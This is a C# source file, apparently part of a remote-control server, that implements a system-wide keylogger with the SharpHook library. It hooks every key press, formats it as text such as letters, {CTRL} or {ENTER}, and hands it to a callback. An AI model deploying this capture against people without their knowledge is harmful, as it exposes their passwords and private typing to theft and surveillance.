using System;
using System.Threading.Tasks;
using SharpHook;
using SharpHook.Native;

namespace Server.Services
{
    public class InputService : IDisposable
    {
        private TaskPoolGlobalHook _hook;
        private bool _isRunning = false;
        private Action<string> _onKeyDataReceived;

        public InputService()
        {
            _hook = new TaskPoolGlobalHook();

            _hook.KeyPressed += OnKeyPressed;
        }
        public void StartKeyLogger(Action<string> callback)
        {
            if (_isRunning) return;

            _onKeyDataReceived = callback;
            _isRunning = true;

            Task.Run(() => 
            {
                try
                {
                    Console.WriteLine("Keylogger started.");
                    _hook.Run(); // Lệnh này sẽ chạy vòng lặp chặn (blocking loop) cho đến khi Dispose
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Keylogger error: {ex.Message}");
                }
            });
        }
        public void StopKeyLogger()
        {
            if (!_isRunning) return;

            
            _isRunning = false;
            if (_hook.IsRunning)
            {
                _onKeyDataReceived = null;
                Console.WriteLine("Keylogger stopped (callback removed).");
                
                _hook.Dispose();
                _hook = new TaskPoolGlobalHook();
                _hook.KeyPressed += OnKeyPressed;
            }
        }


        private void OnKeyPressed(object sender, KeyboardHookEventArgs e)
        {
            if (!_isRunning || _onKeyDataReceived == null) return;

            var keyData = FormatKey(e.Data);

            _onKeyDataReceived?.Invoke(keyData);
        }

private string FormatKey(KeyboardEventData data)
       {
           var keyCode = data.KeyCode;
           var keyChar = data.KeyChar;


           // Handle modifier keys
           switch (keyCode)
           {
               case KeyCode.VcLeftMeta:
               case KeyCode.VcRightMeta: return "{CMD}";
               case KeyCode.VcLeftShift:
               case KeyCode.VcRightShift: return "{SHIFT}";
               case KeyCode.VcLeftControl:
               case KeyCode.VcRightControl: return "{CTRL}";
               case KeyCode.VcLeftAlt:
               case KeyCode.VcRightAlt: return "{ALT}";
           }


           // Handle character keys
           if (keyChar != 0 && keyChar != 0xFFFE && keyChar != 0xFFFF)
           {
               if (keyChar == '\r' || keyChar == '\n') return "{ENTER}";
               if (keyChar == '\t') return "{TAB}";
               if (keyChar == ' ') return " ";
               return keyChar.ToString();
           }


           // Handle special keys by KeyCode
           switch (keyCode)
           {
               case KeyCode.VcA: return "a";
               case KeyCode.VcB: return "b";
               case KeyCode.VcC: return "c";
               case KeyCode.VcD: return "d";
               case KeyCode.VcE: return "e";
               case KeyCode.VcF: return "f";
               case KeyCode.VcG: return "g";
               case KeyCode.VcH: return "h";
               case KeyCode.VcI: return "i";
               case KeyCode.VcJ: return "j";
               case KeyCode.VcK: return "k";
               case KeyCode.VcL: return "l";
               case KeyCode.VcM: return "m";
               case KeyCode.VcN: return "n";
               case KeyCode.VcO: return "o";
               case KeyCode.VcP: return "p";
               case KeyCode.VcQ: return "q";
               case KeyCode.VcR: return "r";
               case KeyCode.VcS: return "s";
               case KeyCode.VcT: return "t";
               case KeyCode.VcU: return "u";
               case KeyCode.VcV: return "v";
               case KeyCode.VcW: return "w";
               case KeyCode.VcX: return "x";
               case KeyCode.VcY: return "y";
               case KeyCode.VcZ: return "z";
               case KeyCode.Vc0: return "0";
               case KeyCode.Vc1: return "1";
               case KeyCode.Vc2: return "2";
               case KeyCode.Vc3: return "3";
               case KeyCode.Vc4: return "4";
               case KeyCode.Vc5: return "5";
               case KeyCode.Vc6: return "6";
               case KeyCode.Vc7: return "7";
               case KeyCode.Vc8: return "8";
               case KeyCode.Vc9: return "9";
               case KeyCode.VcSpace: return " ";
               case KeyCode.VcEnter: return "{ENTER}";
               case KeyCode.VcBackspace: return "{BACK}";
               case KeyCode.VcTab: return "{TAB}";
               case KeyCode.VcMinus: return "-";
               case KeyCode.VcEquals: return "=";
               case KeyCode.VcOpenBracket: return "[";
               case KeyCode.VcCloseBracket: return "]";
               case KeyCode.VcSemicolon: return ";";
               case KeyCode.VcQuote: return "'";
               case KeyCode.VcComma: return ",";
               case KeyCode.VcPeriod: return ".";
               case KeyCode.VcSlash: return "/";
               default: return "";
           }
       }





        public void Dispose()
        {
            _hook?.Dispose();
        }
    }
}